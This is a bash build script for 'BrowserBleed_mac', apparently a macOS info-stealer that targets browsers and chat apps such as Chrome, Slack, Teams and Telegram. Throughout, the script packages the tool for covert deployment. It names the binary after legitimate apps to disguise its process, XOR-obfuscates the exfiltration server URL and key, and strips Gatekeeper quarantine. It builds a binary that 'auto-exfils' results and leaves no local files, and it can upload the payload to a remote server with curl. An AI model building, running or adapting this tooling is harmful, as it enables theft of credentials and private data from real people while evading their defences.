#!/usr/bin/env bash
# Build BrowserBleed_mac as a standalone binary with the report server baked in.
# Run on macOS with Python 3.10+:
#   chmod +x build_mac.sh && ./build_mac.sh
#
# The resulting binary auto-exfils on every run and leaves no local files on the target.
#
# Available presets:
#   Browsers:  chrome, edge, brave, firefox, opera
#   Chat:      slack, discord, teams, zoom, whatsapp, telegram
#
# Examples:
#   ./build_mac.sh --preset chrome
#   ./build_mac.sh --preset slack
#   ./build_mac.sh --preset teams --exfil-url https://reports.example.com --exfil-key mykey
#   ./build_mac.sh --name systemd-helper --exfil-url https://... --exfil-key ...
#
# To point at a different server without deploy/config:
#   EXFIL_URL=https://reports.example.com EXFIL_KEY=mykey ./build_mac.sh --preset chrome

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BUILD_TMP="$(mktemp -d)"
trap 'rm -rf "$BUILD_TMP"' EXIT

# ── Preset definitions ────────────────────────────────────────────────────────
declare -A PRESET_NAMES=(
    [chrome]="google-chrome"
    [edge]="microsoft-edge"
    [brave]="brave-browser"
    [firefox]="firefox"
    [opera]="opera"
    [slack]="slack"
    [discord]="discord"
    [teams]="teams"
    [zoom]="zoom"
    [whatsapp]="whatsapp-desktop"
    [telegram]="telegram-desktop"
)

declare -A PRESET_DESCS=(
    [chrome]="Google Chrome"
    [edge]="Microsoft Edge"
    [brave]="Brave Browser"
    [firefox]="Mozilla Firefox"
    [opera]="Opera"
    [slack]="Slack"
    [discord]="Discord"
    [teams]="Microsoft Teams"
    [zoom]="Zoom"
    [whatsapp]="WhatsApp"
    [telegram]="Telegram"
)

# ── Argument parsing ──────────────────────────────────────────────────────────
PRESET=""
BINARY_NAME=""
EXFIL_URL="${EXFIL_URL:-}"
EXFIL_KEY="${EXFIL_KEY:-}"
UPLOAD=0

print_usage() {
    echo "Usage: ./build_mac.sh [OPTIONS]"
    echo ""
    echo "  --preset NAME       Use a named preset (see list below)"
    echo "  --name BINARY       Custom binary name (process name in ps)"
    echo "  --exfil-url URL     Override exfil server URL"
    echo "  --exfil-key KEY     Override exfil API key"
    echo "  --upload            Upload built binary to the payload server after building"
    echo ""
    echo "Presets:"
    echo "  BROWSERS"
    for k in chrome edge brave firefox opera; do
        printf "    %-12s %s\n" "$k" "${PRESET_DESCS[$k]}"
    done
    echo "  CHAT APPS"
    for k in slack discord teams zoom whatsapp telegram; do
        printf "    %-12s %s\n" "$k" "${PRESET_DESCS[$k]}"
    done
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        --preset)     PRESET="$2";      shift 2 ;;
        --name)       BINARY_NAME="$2"; shift 2 ;;
        --exfil-url)  EXFIL_URL="$2";   shift 2 ;;
        --exfil-key)  EXFIL_KEY="$2";   shift 2 ;;
        --upload)     UPLOAD=1;         shift ;;
        --help|-h)    print_usage; exit 0 ;;
        *) echo "[!] Unknown argument: $1"; print_usage; exit 1 ;;
    esac
done

# ── Apply preset ──────────────────────────────────────────────────────────────
if [[ -n "$PRESET" ]]; then
    PRESET_LC="${PRESET,,}"
    if [[ -z "${PRESET_NAMES[$PRESET_LC]+_}" ]]; then
        echo "[!] Unknown preset '$PRESET'"
        echo "    Available: ${!PRESET_NAMES[*]}"
        exit 1
    fi
    [[ -z "$BINARY_NAME" ]] && BINARY_NAME="${PRESET_NAMES[$PRESET_LC]}"
fi

# ── Interactive menu (shown when no --preset or --name given) ─────────────────
if [[ -z "$BINARY_NAME" ]]; then
    echo ""
    echo "Select a preset:"
    echo ""
    echo "  BROWSERS"
    echo "  [1]  chrome     - google-chrome"
    echo "  [2]  edge       - microsoft-edge"
    echo "  [3]  brave      - brave-browser"
    echo "  [4]  firefox    - firefox"
    echo "  [5]  opera      - opera"
    echo ""
    echo "  CHAT APPS"
    echo "  [6]  slack      - slack"
    echo "  [7]  discord    - discord"
    echo "  [8]  teams      - teams"
    echo "  [9]  zoom       - zoom"
    echo "  [10] whatsapp   - whatsapp-desktop"
    echo "  [11] telegram   - telegram-desktop"
    echo ""
    read -rp "Enter number: " CHOICE
    MENU=("" "chrome" "edge" "brave" "firefox" "opera" "slack" "discord" "teams" "zoom" "whatsapp" "telegram")
    if [[ "$CHOICE" =~ ^[0-9]+$ ]] && (( CHOICE >= 1 && CHOICE <= 11 )); then
        PRESET_LC="${MENU[$CHOICE]}"
        BINARY_NAME="${PRESET_NAMES[$PRESET_LC]}"
        echo "[*] Selected: $PRESET_LC → $BINARY_NAME"
    else
        echo "[!] Invalid selection. Run again with --preset NAME or --name BINARY."
        exit 1
    fi
fi

# ── Load deploy/config if exfil values not set ───────────────────────────────
CONFIG="$SCRIPT_DIR/deploy/config"
if [[ -f "$CONFIG" ]]; then
    DOMAIN_VAL=$(grep '^DOMAIN=' "$CONFIG" | cut -d= -f2- || true)
    KEY_VAL=$(grep '^BB_API_KEY=' "$CONFIG" | cut -d= -f2- || true)
    [[ -z "$EXFIL_URL" && -n "$DOMAIN_VAL" ]] && EXFIL_URL="https://$DOMAIN_VAL"
    [[ -z "$EXFIL_KEY" && -n "$KEY_VAL"    ]] && EXFIL_KEY="$KEY_VAL"
fi

if [[ -z "$EXFIL_URL" || -z "$EXFIL_KEY" ]]; then
    echo "[!] EXFIL_URL or EXFIL_KEY not set"
    echo "    Add DOMAIN and BB_API_KEY to deploy/config, or pass --exfil-url / --exfil-key"
    echo "    or set EXFIL_URL=... EXFIL_KEY=... in the environment"
    exit 1
fi

echo "[*] Building: $BINARY_NAME"
echo "    Exfil URL:  $EXFIL_URL"
echo "    Exfil key:  ${EXFIL_KEY:0:4}****"
echo "    Process name in ps: $BINARY_NAME"

# ── Check Python ──────────────────────────────────────────────────────────────
PYTHON=""
for candidate in python3.13 python3.12 python3.11 python3.10 python3 python; do
    if command -v "$candidate" &>/dev/null; then
        ver=$("$candidate" -c 'import sys; print(sys.version_info.major * 100 + sys.version_info.minor)' 2>/dev/null) || continue
        if (( ver >= 310 )); then
            PYTHON="$candidate"
            echo "[+] Found $($candidate --version)"
            break
        fi
    fi
done

if [[ -z "$PYTHON" ]]; then
    echo "[!] Python 3.10+ not found."
    echo "    Install via Homebrew:  brew install python@3.12"
    echo "    Or download from:      https://www.python.org/downloads/"
    exit 1
fi

echo "[*] Installing Python packages (cryptography, pyinstaller)..."
"$PYTHON" -m pip install --quiet --upgrade cryptography nuitka zstandard
echo "[+] Python packages ready"
echo ""

# ── XOR-encrypt the exfil URL + key, then patch a temp copy of the source ────
TMP_SRC="$BUILD_TMP/BrowserBleed_mac.py"

# Generate a random 32-byte key and XOR-encrypt URL and key so they aren't plaintext.
XOR_OUT=$(EXFIL_URL="$EXFIL_URL" EXFIL_KEY="$EXFIL_KEY" "$PYTHON" - <<'PYEOF'
import os, secrets
url = os.environ["EXFIL_URL"]
key = os.environ["EXFIL_KEY"]
k = secrets.token_bytes(32)
def enc(s):
    b = s.encode()
    return bytes(x ^ k[i % len(k)] for i, x in enumerate(b)).hex()
print(k.hex(), enc(url), enc(key))
PYEOF
)
read -r XOR_KEY_HEX URL_ENC KEY_ENC <<< "$XOR_OUT"

sed \
    -e "s|_EXFIL_URL_ENC: str = \"\"|_EXFIL_URL_ENC: str = \"$URL_ENC\"|" \
    -e "s|_EXFIL_KEY_ENC: str = \"\"|_EXFIL_KEY_ENC: str = \"$KEY_ENC\"|" \
    -e "s|_EXFIL_XOR_KEY: str = \"\"|_EXFIL_XOR_KEY: str = \"$XOR_KEY_HEX\"|" \
    "$SCRIPT_DIR/BrowserBleed_mac.py" > "$TMP_SRC"

if ! grep -q "$URL_ENC" "$TMP_SRC" || ! grep -q "$XOR_KEY_HEX" "$TMP_SRC"; then
    echo "[!] Substitution failed - encrypted values not found in patched source. Aborting."
    exit 1
fi

# ── Build ─────────────────────────────────────────────────────────────────────
echo "[*] Building with Nuitka (native compile, no PyInstaller bootloader)..."
"$PYTHON" -m nuitka \
    --standalone --onefile \
    --assume-yes-for-downloads \
    --output-filename="$BINARY_NAME" \
    --output-dir="$SCRIPT_DIR" \
    "$TMP_SRC"

rm -rf "$SCRIPT_DIR"/*.build "$SCRIPT_DIR"/*.dist "$SCRIPT_DIR"/*.onefile-build 2>/dev/null || true

# Strip Gatekeeper quarantine so the binary runs without a signed identity.
echo "[*] Stripping quarantine attribute..."
xattr -dr com.apple.quarantine "$SCRIPT_DIR/$BINARY_NAME" 2>/dev/null || true

echo ""
echo "[+] Done: $SCRIPT_DIR/$BINARY_NAME"
echo "    Run with: sudo ./$BINARY_NAME"
echo "    Results auto-exfil to $EXFIL_URL"

# ── Upload to payload server ──────────────────────────────────────────────────
if [[ "$UPLOAD" == "1" ]]; then
    echo ""
    echo "[*] Uploading $BINARY_NAME to $EXFIL_URL/payloads ..."
    HTTP_STATUS=$(curl -s -o /tmp/bb_upload_resp.txt -w "%{http_code}" \
        -X POST "$EXFIL_URL/payloads" \
        -H "Authorization: Bearer $EXFIL_KEY" \
        -F "file=@$SCRIPT_DIR/$BINARY_NAME;filename=mac-$BINARY_NAME")
    if [[ "$HTTP_STATUS" =~ ^[23] ]]; then
        echo "[+] Uploaded: $EXFIL_URL/payloads/$BINARY_NAME"
    else
        echo "[!] Upload failed (HTTP $HTTP_STATUS)"
        cat /tmp/bb_upload_resp.txt 2>/dev/null && echo ""
    fi
    rm -f /tmp/bb_upload_resp.txt
fi
